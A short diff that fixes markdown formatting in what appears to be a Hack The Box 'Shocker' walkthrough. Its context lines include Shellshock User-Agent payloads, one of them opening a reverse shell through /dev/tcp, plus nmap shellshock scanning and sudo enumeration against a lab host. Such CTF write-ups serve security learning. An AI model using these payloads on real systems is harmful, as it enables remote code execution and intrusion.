@@ -117,7 +117,7 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id' " http://10.10.10.56/cgi
 Alternatively, we can run the `nmap` for discover the vuln:
 
 ```bash
-nmap -sV -p 80 --script http-shellshock --script-args uri**=**/cgi-bin/user.sh 10.10.10.56
+nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
 ```
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Shocker/Untitled%208.png)
@@ -139,7 +139,7 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14
 We check the `perl` run sudo.
 
 ```bash
-**sudo -l**
+sudo -l
 ```
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Shocker/Untitled%2010.png)
